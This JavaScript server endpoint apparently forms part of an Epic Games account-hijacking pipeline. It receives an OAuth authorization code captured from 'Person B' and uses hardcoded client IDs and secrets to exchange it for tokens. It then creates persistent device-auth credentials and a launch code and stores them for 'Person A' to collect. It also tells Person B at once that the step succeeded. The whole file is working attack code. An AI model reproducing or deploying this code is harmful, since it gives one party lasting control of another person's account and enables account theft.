/**
 * POST /deliver  { token, code }
 * Called by Person B's /pop page once it captures the auth code.
 * Runs the full Epic chain, writes result to Supabase.
 * Person A's polling /status sees status='done' on next poll.
 */
import https from 'https';
import { getSession, deliverCode } from './_db.js';

const AND_ID       = '3f69e56c7649492c8cc29f1af08a8a12';
const AND_SECRET   = 'b51ee9cb12234f50a69efa67ef53812e';
const LAUNCH_ID    = '34a02cf8f4414e29b15921876da36f9a';
const LAUNCH_SEC   = 'daafbccc737745039dffe53d94fc76cf';
const PC_ID        = 'ec684b8c687f479fadea3cb2ad83f5c6';
const PC_SECRET    = 'e1f31c211f28413186262d37a13fc84d';

const AND_BASIC    = Buffer.from(`${AND_ID}:${AND_SECRET}`).toString('base64');
const LAUNCH_BASIC = Buffer.from(`${LAUNCH_ID}:${LAUNCH_SEC}`).toString('base64');
const PC_BASIC     = Buffer.from(`${PC_ID}:${PC_SECRET}`).toString('base64');

const TOKEN_URL    = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token';
const EXCHANGE_URL = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange';
const DEVICE_URL   = id => `https://account-public-service-prod.ol.epicgames.com/account/api/public/account/${id}/deviceAuth`;

function epicFetch(url, { method='GET', headers={}, body=null }={}) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const req = https.request({ hostname:u.hostname, path:u.pathname+u.search, method, headers }, res => {
      let d=''; res.on('data',c=>d+=c); res.on('end',()=>{
        try{resolve({status:res.statusCode,body:JSON.parse(d)})}
        catch{resolve({status:res.statusCode,body:d})}
      });
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

async function runChain(authCode) {
  console.log('[CHAIN] authCode:', authCode);

  // Step 1: auth code → access token (try launcherAppClient2 first, fallback PC)
  const b1 = new URLSearchParams({ grant_type:'authorization_code', code:authCode }).toString();
  let r1 = await epicFetch(TOKEN_URL, {
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':`Basic ${LAUNCH_BASIC}`,'Content-Length':Buffer.byteLength(b1).toString()},
    body: b1,
  });
  if (r1.status !== 200) {
    r1 = await epicFetch(TOKEN_URL, {
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':`Basic ${PC_BASIC}`,'Content-Length':Buffer.byteLength(b1).toString()},
      body: b1,
    });
  }
  console.log('[CHAIN] step1 status:', r1.status, r1.body?.displayName || r1.body?.errorCode || '');
  if (r1.status !== 200) throw new Error(`token exchange failed: ${r1.body?.errorCode || r1.status}`);

  let { access_token, account_id, displayName } = r1.body;

  // Step 2: swap to Android token (device auth requires it)
  try {
    const s = await epicFetch(EXCHANGE_URL, { headers:{ Authorization:`Bearer ${access_token}` }});
    if (s.status===200 && s.body?.code) {
      const b2 = new URLSearchParams({ grant_type:'exchange_code', exchange_code:s.body.code }).toString();
      const r2 = await epicFetch(TOKEN_URL, {
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':`Basic ${AND_BASIC}`,'Content-Length':Buffer.byteLength(b2).toString()},
        body: b2,
      });
      if (r2.status===200 && r2.body?.access_token) {
        access_token = r2.body.access_token;
        console.log('[CHAIN] step2 ✅ Android token');
      }
    }
  } catch(e) { console.warn('[CHAIN] step2 non-fatal:', e.message); }

  // Step 3: create device auth
  const r3 = await epicFetch(DEVICE_URL(account_id), {
    method:'POST',
    headers:{ Authorization:`Bearer ${access_token}`, 'Content-Type':'application/json', 'Content-Length':'2' },
    body: '{}',
  });
  console.log('[CHAIN] step3 status:', r3.status);
  if (r3.status !== 200) throw new Error(`device auth failed: ${r3.body?.errorCode || r3.status}`);
  const deviceId = r3.body.deviceId;
  console.log('[CHAIN] step3 ✅ deviceId:', deviceId);

  // Step 4: launcherAppClient2 launch exchange code
  let launchCode = null;
  try {
    const e1 = await epicFetch(EXCHANGE_URL, { headers:{ Authorization:`Bearer ${access_token}` }});
    if (e1.status===200 && e1.body?.code) {
      const lb = new URLSearchParams({ grant_type:'exchange_code', exchange_code:e1.body.code }).toString();
      const lr = await epicFetch(TOKEN_URL, {
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':`Basic ${LAUNCH_BASIC}`,'Content-Length':Buffer.byteLength(lb).toString()},
        body: lb,
      });
      if (lr.status===200 && lr.body?.access_token) {
        const e2 = await epicFetch(EXCHANGE_URL, { headers:{ Authorization:`Bearer ${lr.body.access_token}` }});
        if (e2.status===200 && e2.body?.code) {
          launchCode = e2.body.code;
          console.log('[CHAIN] step4 ✅ launchCode:', launchCode);
        }
      }
    }
  } catch(e) { console.warn('[CHAIN] step4 non-fatal:', e.message); }

  console.log('[CHAIN] ✅ complete:', displayName, account_id);
  return { authCode, displayName, accountId: account_id, deviceId, launchCode };
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST')   return res.status(405).end();

  let body;
  try { body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body; }
  catch { return res.status(400).json({ ok:false, error:'bad-json' }); }

  const token = String(body?.token || '').trim();
  const code  = String(body?.code  || '').trim().toLowerCase();

  console.log(`[DELIVER] token=${token.slice(0,8)} code=${code}`);

  if (!token || !/^[a-f0-9]{32}$/.test(code)) {
    return res.status(400).json({ ok:false, error:'bad-params' });
  }

  const s = await getSession(token);
  if (!s || s.status === 'done') {
    return res.status(410).json({ ok:false, error:'session-expired' });
  }

  // Respond to Person B immediately so their page shows success fast
  res.status(200).json({ ok: true });

  // Run chain and write to DB — Person A's poll will pick it up
  try {
    const result = await runChain(code);
    await deliverCode(token, code, result);
  } catch(err) {
    console.error('[DELIVER] chain error:', err.message);
    await deliverCode(token, code, { authCode: code, error: err.message });
  }
}
